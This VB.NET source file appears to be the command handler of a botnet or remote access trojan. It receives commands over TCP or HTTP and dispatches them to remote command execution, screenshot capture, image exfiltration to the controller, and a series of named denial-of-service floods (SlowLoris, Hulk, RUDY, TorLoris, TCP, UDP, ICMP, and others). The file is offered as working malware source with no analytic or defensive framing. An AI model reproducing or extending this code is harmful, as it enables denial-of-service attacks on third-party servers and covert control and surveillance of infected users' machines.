Imports System.Net.Sockets
Imports System.Security.Cryptography
Imports Newtonsoft.Json

Namespace Alduin.Stump.Class.Commands
    Public Class CommandHandler : Implements ICommand
        Public Sub New()

        End Sub
        Public Function CommandHandler(ByVal request As String, ByVal client As TcpClient) As String
            Dim method As String = JsonMethodSelector(request) 'Handle TCP request
            Select Case method
                Case "Execute"
                    Dim ModelDes As ExecuteModel = JsonConvert.DeserializeAnonymousType(request, New ExecuteModel)
                    Return ExecuteCommand.Handler(ModelDes)
                Case "Website"
                    Dim ModelDes As WebsiteOpenModel = JsonConvert.DeserializeAnonymousType(request, New WebsiteOpenModel)
                    Return OpenWebsiteCommand.Handler(ModelDes)
                Case "Message"
                    Dim ModelDes As MessageModel = JsonConvert.DeserializeAnonymousType(request, New MessageModel)
                    Return MessageCommand.Handler(ModelDes)
                Case "Arme"
                    Dim ModelDes As ArmeModel = JsonConvert.DeserializeAnonymousType(request, New ArmeModel)
                    GetFloodsBase().Reset()
                    Dim attack As ARME = New ARME(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "SlowLoris"
                    Dim ModelDes As SlowLorisModel = JsonConvert.DeserializeAnonymousType(request, New SlowLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As SlowLoris = New SlowLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "HttpBandWidth"
                    Dim ModelDes As HttpBandWidthModel = JsonConvert.DeserializeAnonymousType(request, New HttpBandWidthModel)
                    GetFloodsBase().Reset()
                    Dim attack As HttpBandWidth = New HttpBandWidth(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Hulk"
                    Dim ModelDes As HulkModel = JsonConvert.DeserializeAnonymousType(request, New HulkModel)
                    GetFloodsBase().Reset()
                    Dim attack As Hulk = New Hulk(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "TorLoris"
                    Dim ModelDes As TorLorisModel = JsonConvert.DeserializeAnonymousType(request, New TorLorisModel)
                    GetFloodsBase().Reset()
                    Dim attack As TorLoris = New TorLoris(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Rudy"
                    Dim ModelDes As RudyModel = JsonConvert.DeserializeAnonymousType(request, New RudyModel)
                    GetFloodsBase().Reset()
                    Dim attack As Rudy = New Rudy(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Tcp"
                    Dim ModelDes As TcpModel = JsonConvert.DeserializeAnonymousType(request, New TcpModel)
                    GetFloodsBase().Reset()
                    Dim attack As TCP = New TCP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Udp"
                    Dim ModelDes As UdpModel = JsonConvert.DeserializeAnonymousType(request, New UdpModel)
                    GetFloodsBase().Reset()
                    Dim attack As UDP = New UDP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "Icmp"
                    Dim ModelDes As ICMPModel = JsonConvert.DeserializeAnonymousType(request, New ICMPModel)
                    GetFloodsBase().Reset()
                    Dim attack As ICMP = New ICMP(ModelDes)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "GetAllImgJson"
                    Return AllImgToJson.Handler()
            End Select
            Dim splittedHeader As String = RequestSplitter(request, 1, " ")
            Dim url As String = RequestSplitter(splittedHeader, 0, "?")
            Dim GetAttr As String = RequestSplitter(url, 1, "/") ' Handle HTTP request
            Dim Attr As String = RequestSplitter(splittedHeader, 1, "?").Replace("%20", " ")
            Select Case GetAttr 'Domain/method/value/key
                Case "Forbidden"
                    Return "Forbidden"
                Case "GetScreenShot"
                    StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
                    Dim log As LogModel = New LogModel With {
                            .Message = GetFloodsBase().GetMessage(),
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                Case "GetImg"
                    GetImg.Handler(Attr, client)
                    Dim log As LogModel = New LogModel With {
                            .Message = "ok",
                            .KeyUnique = GetConfigJson().KeyUnique,
                            .Type = "Success"
                    }
                    Return JsonConvert.SerializeObject(log)
                    'Case "GetAllImgJson"
                    ' StreamWriterJson(AllImgToJson.Handler(), client)
                    'Return ""
            End Select
            Return "Command execute Failed!"
        End Function
        Public Function JsonMethodSelector(ByVal request As String) As String
            Dim method As String = ""
            Try
                For i = request.IndexOf("Method") To request.Length - 1
                    If request.Chars(i) = "}" Or request.Chars(i) = "," Then
                        Exit For
                    End If
                    method += request.Chars(i)
                Next
                method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
                Return method
            Catch
                Return ""
            End Try
        End Function
        Public Function RequestSplitter(ByVal model As String, ByVal index As Integer, ByVal splitchar As Char) As String
            Try
                Dim splitUrl As String() = model.Split(New Char() {splitchar})
                Return splitUrl(index)

            Catch ex As Exception
                Return "Forbidden"
            End Try
        End Function
    End Class
End Namespace


